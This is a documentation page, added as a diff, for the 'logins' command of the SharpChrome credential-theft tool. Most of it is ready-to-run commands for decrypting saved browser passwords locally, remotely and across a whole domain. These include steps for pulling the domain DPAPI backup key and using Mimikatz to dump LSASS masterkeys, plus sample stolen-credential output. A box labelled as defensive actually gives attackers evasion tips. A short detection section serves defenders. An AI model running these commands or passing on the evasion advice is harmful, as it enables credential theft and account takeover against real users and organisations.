@@ -1,0 +1,543 @@
+---
+title: "SharpChrome Logins"
+description: "Decrypt and extract saved login credentials from Chrome, Edge, Brave, and Slack browsers using DPAPI decryption techniques"
+icon: "key"
+---
+
+## Overview
+
+The **logins** command searches for Chromium-based browser 'Login Data' files and decrypts saved login credentials including usernames and passwords. This command targets the SQLite databases where browsers store encrypted authentication credentials for websites.
+
+SharpChrome uses lockless SQLite database access, meaning target browsers don't need to be closed during credential extraction. The command automatically handles both legacy DPAPI-protected credentials and newer Chrome 80+ AES-encrypted credentials.
+
+### Key Features
+
+- Extracts saved website login credentials from browser databases
+- Supports multiple decryption methods (CryptUnprotectData, DPAPI masterkeys, domain backup keys)
+- Handles Chrome 80+ AES state key encryption automatically
+- Works while browser is running (lockless database access)
+- Supports local and remote credential extraction
+- Filters output to show only entries with passwords by default
+
+## Basic Usage
+
+<CodeGroup>
+
+```bash Unprivileged Context
+# Decrypt logins for current user using CryptUnprotectData
+SharpChrome.exe logins
+
+# Decrypt logins from Edge browser
+SharpChrome.exe logins /browser:edge
+
+# Decrypt logins from Brave browser
+SharpChrome.exe logins /browser:brave
+```
+
+```bash With Domain DPAPI Backup Key
+# Use domain backup key to decrypt all users
+SharpChrome.exe logins /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...
+
+# Use backup key file
+SharpChrome.exe logins /pvk:key.pvk
+```
+
+```bash With Masterkeys
+# Use extracted GUID:SHA1 masterkey mappings
+SharpChrome.exe logins {GUID1}:SHA1 {GUID2}:SHA1
+
+# Use masterkey file
+SharpChrome.exe logins /mkfile:masterkeys.txt
+```
+
+```bash With User Credentials
+# Decrypt using plaintext password
+SharpChrome.exe logins /password:Password123!
+
+# Decrypt using NTLM hash
+SharpChrome.exe logins /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+# Decrypt using DPAPI prekey (from Mimikatz sekurlsa::msv)
+SharpChrome.exe logins /prekey:SHA1_PREKEY_HERE
+```
+
+</CodeGroup>
+
+## Command Arguments
+
+<Tabs>
+  <Tab title="Decryption">
+    ### Decryption Arguments
+
+    <ParamField path="/unprotect" type="flag">
+      Force use of CryptUnprotectData() for decryption. This is the default behavior when running in an unprivileged context. Works only from the user context that saved the credentials.
+    </ParamField>
+
+    <ParamField path="/pvk" type="string">
+      Use a DPAPI domain backup key to decrypt user masterkeys first, then use those to decrypt login credentials.
+
+      Accepts two formats:
+      - Base64-encoded key: `/pvk:HvG1sAAAAAABAAAAAAAAAAAAAAACU...`
+      - File path: `/pvk:key.pvk`
+
+      Requires domain admin rights to obtain the backup key.
+    </ParamField>
+
+    <ParamField path="{GUID}:SHA1" type="string">
+      One or more DPAPI masterkey GUID:SHA1 mappings for decryption.
+
+      ```bash
+      SharpChrome.exe logins {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd...
+      ```
+
+      Obtain these with Mimikatz: `sekurlsa::dpapi`
+    </ParamField>
+
+    <ParamField path="/mkfile" type="file">
+      File containing one or more GUID:SHA1 masterkey mappings (one per line).
+
+      ```bash
+      SharpChrome.exe logins /mkfile:masterkeys.txt
+      ```
+    </ParamField>
+
+    <ParamField path="/password" type="string">
+      Decrypt target user's masterkeys using plaintext password. Works remotely when combined with `/server`.
+
+      ```bash
+      SharpChrome.exe logins /password:Password123!
+      ```
+    </ParamField>
+
+    <ParamField path="/ntlm" type="string">
+      Decrypt target user's masterkeys using NTLM hash. Works remotely when combined with `/server`.
+
+      ```bash
+      SharpChrome.exe logins /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+      ```
+    </ParamField>
+
+    <ParamField path="/prekey" type="string">
+      Decrypt target user's masterkeys using DPAPI prekey (domain or local SHA1). Works remotely.
+
+      - Domain users: Use `dpapi` field from Mimikatz `sekurlsa::msv` output
+      - Local users: Use `sha1` field from Mimikatz `sekurlsa::msv` output
+    </ParamField>
+
+    <ParamField path="/rpc" type="flag">
+      Decrypt target user's masterkeys by asking the domain controller to decrypt them via RPC.
+    </ParamField>
+
+    <ParamField path="/statekey" type="string">
+      Provide a pre-decrypted AES state key for Chrome 80+ credential decryption.
+
+      ```bash
+      SharpChrome.exe logins /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+      ```
+
+      Obtain the state key first using the `statekeys` command.
+    </ParamField>
+  </Tab>
+
+  <Tab title="Targeting">
+    ### Targeting Arguments
+
+    <ParamField path="/target" type="path">
+      Specify a specific Login Data file or user directory to triage.
+
+      **File targeting:**
+      ```bash
+      SharpChrome.exe logins /target:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+      ```
+
+      **User directory targeting:**
+      ```bash
+      SharpChrome.exe logins /target:C:\Users\targetuser\
+      ```
+    </ParamField>
+
+    <ParamField path="/server" type="string">
+      Triage a remote server. Must be combined with `/pvk` or `/password` for decryption.
+
+      ```bash
+      SharpChrome.exe logins /server:WORKSTATION01 /pvk:key.pvk
+      ```
+
+      Requires administrative access to the remote system.
+    </ParamField>
+
+    <ParamField path="/browser" type="string">
+      Specify which Chromium-based browser to target.
+
+      Supported values:
+      - `chrome` (default) - Google Chrome
+      - `edge` - Chromium-based Microsoft Edge
+      - `brave` - Brave Browser
+      - `slack` - Slack Desktop App
+
+      ```bash
+      SharpChrome.exe logins /browser:edge
+      ```
+    </ParamField>
+  </Tab>
+
+  <Tab title="Output">
+    ### Output Arguments
+
+    <ParamField path="/format" type="string">
+      Specify the output format for credential display.
+
+      Available formats:
+      - `csv` (default) - Comma-separated values format
+      - `table` - Formatted table display
+
+      ```bash
+      SharpChrome.exe logins /format:table
+      ```
+    </ParamField>
+
+    <ParamField path="/showall" type="flag">
+      Display ALL login entries including those with null/empty passwords. By default, only entries with non-null passwords are shown.
+
+      ```bash
+      SharpChrome.exe logins /showall
+      ```
+    </ParamField>
+
+    <ParamField path="/consoleoutfile" type="file">
+      Redirect all console output to a file on disk.
+
+      ```bash
+      SharpChrome.exe logins /consoleoutfile:C:\Temp\logins.txt
+      ```
+    </ParamField>
+  </Tab>
+
+  <Tab title="Filtering">
+    ### Filtering Options
+
+    The logins command displays only non-null password entries by default. Use `/showall` to include all entries regardless of password status.
+
+    When run in elevated context, Login Data files for ALL users are triaged. In unprivileged context, only the current user's files are processed.
+
+    ### Privilege Context Behavior
+
+    **Unprivileged Context:**
+    - Automatically uses CryptUnprotectData() for decryption
+    - Only processes current user's Login Data files
+    - No administrative rights required
+    - Only works for the logged-in user's credentials
+
+    **Elevated Context:**
+    - Processes ALL users' Login Data files
+    - Can use masterkeys, backup keys, or passwords for any user
+    - Requires local administrator privileges
+    - Enables remote server targeting
+  </Tab>
+</Tabs>
+
+## Chrome 80+ State Key Encryption
+
+Starting with Chrome version 80, Google introduced a new encryption mechanism for cookies and login data using AES encryption with a state key stored in the browser's Local State file.
+
+### How It Works
+
+1. **State Key Storage**: An AES key is stored in `AppData\Local\Google\Chrome\User Data\Local State`
+2. **DPAPI Protection**: The state key itself is encrypted with DPAPI
+3. **Credential Encryption**: New login entries are encrypted with this AES state key instead of directly with DPAPI
+
+### Decryption Process
+
+SharpChrome handles this automatically:
+
+```bash
+# SharpChrome automatically decrypts the state key and uses it
+SharpChrome.exe logins /pvk:key.pvk
+```
+
+Or manually specify a pre-decrypted state key:
+
+```bash
+# First, extract the state key
+SharpChrome.exe statekeys /pvk:key.pvk
+
+# Then use it to decrypt logins
+SharpChrome.exe logins /statekey:EXTRACTED_STATE_KEY_HERE
+```
+
+### State Key Location
+
+- **Chrome**: `%LOCALAPPDATA%\Google\Chrome\User Data\Local State`
+- **Edge**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`
+- **Brave**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State`
+
+## Supported Browsers
+
+<CardGroup cols={2}>
+  <Card title="Google Chrome" icon="chrome">
+    Default target browser. Decrypts Login Data from Chrome's default profile and all additional profiles.
+
+    **Location**: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`
+  </Card>
+
+  <Card title="Microsoft Edge" icon="edge">
+    Chromium-based Edge browser. Use `/browser:edge` to target.
+
+    **Location**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`
+  </Card>
+
+  <Card title="Brave Browser" icon="shield">
+    Privacy-focused Chromium browser. Use `/browser:brave` to target.
+
+    **Location**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data`
+  </Card>
+
+  <Card title="Slack Desktop" icon="slack">
+    Slack desktop application uses Chromium for credential storage. Use `/browser:slack` to target.
+
+    **Location**: `%APPDATA%\Slack\Cookies`
+  </Card>
+</CardGroup>
+
+## Example Workflows
+
+### Scenario 1: Local Credential Extraction (Unprivileged)
+
+Extract your own saved credentials without administrative rights:
+
+```bash
+# Extract all Chrome logins for current user
+SharpChrome.exe logins
+
+# Display in table format
+SharpChrome.exe logins /format:table
+
+# Include entries with empty passwords
+SharpChrome.exe logins /showall
+```
+
+### Scenario 2: Domain-Wide Credential Extraction
+
+As domain admin, extract credentials from all domain workstations:
+
+```bash
+# Step 1: Retrieve domain DPAPI backup key
+SharpChrome.exe backupkey /server:DC01.domain.com /file:backup.pvk
+
+# Step 2: Extract logins from local machine (all users)
+SharpChrome.exe logins /pvk:backup.pvk
+
+# Step 3: Extract logins from remote workstation
+SharpChrome.exe logins /server:WORKSTATION01 /pvk:backup.pvk
+```
+
+### Scenario 3: Targeted User Extraction with Mimikatz
+
+Combine with Mimikatz for targeted user credential extraction:
+
+```bash
+# Step 1: Extract DPAPI masterkeys from LSASS with Mimikatz
+mimikatz # privilege::debug
+mimikatz # sekurlsa::dpapi
+
+# Output shows: {GUID}:SHA1 mappings
+# Example: {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...
+
+# Step 2: Use masterkeys with SharpChrome
+SharpChrome.exe logins {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd...
+```
+
+### Scenario 4: Remote Credential Extraction with Password
+
+Extract credentials from a remote system using a user's password:
+
+```bash
+# Extract logins from remote server using password
+SharpChrome.exe logins /server:WORKSTATION02 /password:Password123!
+
+# Extract Edge logins remotely
+SharpChrome.exe logins /server:WORKSTATION02 /password:Password123! /browser:edge
+```
+
+### Scenario 5: Chrome 80+ with Pre-Extracted State Key
+
+For Chrome 80+, first extract state keys then use them:
+
+```bash
+# Step 1: Extract state keys
+SharpChrome.exe statekeys /pvk:backup.pvk
+
+# Output: Shows decrypted AES state keys
+# Chrome State Key: 3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+
+# Step 2: Use state key to decrypt logins
+SharpChrome.exe logins /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+```
+
+## Example Output
+
+### CSV Format (Default)
+
+```csv
+URL,Username,Password
+https://portal.office.com/,admin@company.com,P@ssw0rd123!
+https://github.com/login,devuser,GitHubPass2024
+https://mail.google.com/,user@gmail.com,MySecurePass!
+https://aws.amazon.com/console/,awsadmin,AWSCredential123
+```
+
+### Table Format
+
+```
+┌─────────────────────────────────────┬──────────────────────┬─────────────────────┐
+│ URL                                  │ Username             │ Password            │
+├─────────────────────────────────────┼──────────────────────┼─────────────────────┤
+│ https://portal.office.com/          │ admin@company.com    │ P@ssw0rd123!        │
+│ https://github.com/login            │ devuser              │ GitHubPass2024      │
+│ https://mail.google.com/            │ user@gmail.com       │ MySecurePass!       │
+│ https://aws.amazon.com/console/     │ awsadmin             │ AWSCredential123    │
+└─────────────────────────────────────┴──────────────────────┴─────────────────────┘
+```
+
+## Detection Considerations
+
+### EDR/AV Detection Vectors
+
+1. **Process Activity**
+   - SharpChrome.exe spawning and accessing browser SQLite databases
+   - Unusual access patterns to Login Data files
+   - Multiple user profile enumeration
+
+2. **File Access Patterns**
+   - Reading Login Data files from multiple user profiles
+   - Accessing Local State files for state key extraction
+   - Lockless SQLite database access
+
+3. **Network Activity**
+   - Remote file access to UNC paths for credential databases
+   - SMB connections to multiple workstations
+   - Domain controller communication for RPC decryption
+
+4. **API Calls**
+   - CryptUnprotectData API calls
+   - DPAPI-related LSA functions
+   - SQLite database operations
+
+### OPSEC Recommendations
+
+<Warning>
+These are defensive detection recommendations. Offensive operators should consider:
+- Running from memory to avoid disk artifacts
+- Using native Windows tools where possible
+- Throttling operations to avoid mass enumeration detection
+- Combining with other lateral movement to blend in
+- Using `/consoleoutfile` to avoid console logging
+</Warning>
+
+### Log Sources
+
+- **Windows Event Logs**: Look for DPAPI-related Event IDs (4692-4694)
+- **Sysmon**: File access events to Login Data files (Event ID 11)
+- **EDR Telemetry**: Process creation, file access, and API call monitoring
+- **Network Logs**: SMB traffic patterns indicating lateral credential harvesting
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="SharpChrome Cookies" icon="cookie" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-cookies">
+    Extract and decrypt browser cookies for session hijacking
+  </Card>
+
+  <Card title="SharpChrome State Keys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-statekeys">
+    Extract AES state keys for Chrome 80+ decryption
+  </Card>
+
+  <Card title="Backup Key Retrieval" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain DPAPI backup key from domain controller
+  </Card>
+
+  <Card title="SharpChrome Overview" icon="chrome" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-overview">
+    Complete SharpChrome documentation and workflows
+  </Card>
+</CardGroup>
+
+## Tips and Troubleshooting
+
+### Common Issues
+
+<AccordionGroup>
+  <Accordion title="No credentials extracted">
+    **Possible causes:**
+    - Browser hasn't saved any credentials
+    - Running as wrong user (credentials are user-specific)
+    - Chrome 80+ requires state key decryption
+    - Incorrect decryption method selected
+
+    **Solutions:**
+    - Verify Login Data file exists and contains data
+    - Run as the user who saved the credentials
+    - For Chrome 80+, extract and use state key
+    - Try alternative decryption methods (/pvk, /password)
+  </Accordion>
+
+  <Accordion title="CryptUnprotectData fails">
+    **Possible causes:**
+    - Not running as the user who encrypted the data
+    - User profile is unloaded
+    - DPAPI masterkey not available
+
+    **Solutions:**
+    - Run in the correct user context
+    - Use `/pvk` with domain backup key instead
+    - Use extracted GUID:SHA1 masterkeys
+    - Ensure user is logged in locally
+  </Accordion>
+
+  <Accordion title="Remote extraction fails">
+    **Possible causes:**
+    - No administrative access to remote system
+    - Firewall blocking SMB/RPC
+    - Missing decryption key (/pvk or /password not provided)
+
+    **Solutions:**
+    - Verify local admin rights on remote system
+    - Check firewall rules for SMB (445) and RPC
+    - Always use `/pvk` or `/password` with `/server`
+  </Accordion>
+
+  <Accordion title="Chrome 80+ credentials show as encrypted">
+    **Possible causes:**
+    - State key not automatically decrypted
+    - Missing AES state key for decryption
+
+    **Solutions:**
+    - Run `statekeys` command first to extract state key
+    - Use `/statekey` parameter with extracted key
+    - Ensure DPAPI decryption method is working
+  </Accordion>
+</AccordionGroup>
+
+### Best Practices
+
+<Tip>
+**Operational Tips:**
+- Always test in a lab environment first
+- Use `/format:table` for easier manual review
+- Combine with `/consoleoutfile` for logging
+- Extract state keys separately for Chrome 80+
+- Use domain backup key for maximum coverage
+- Filter credentials by removing `/showall` flag
+</Tip>
+
+### Performance Considerations
+
+- **Local extraction**: Very fast, typically completes in seconds
+- **Remote extraction**: Depends on network latency and number of users
+- **Lockless access**: Browser can remain open during extraction
+- **Multi-user systems**: Processing time scales with number of user profiles
+
+### Additional Resources
+
+- [Mimikatz DPAPI Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi)
+- [Chrome Login Data Database Schema](https://www.chromium.org/developers/design-documents/password-generation)
+- [DPAPI Operational Guidance](https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)
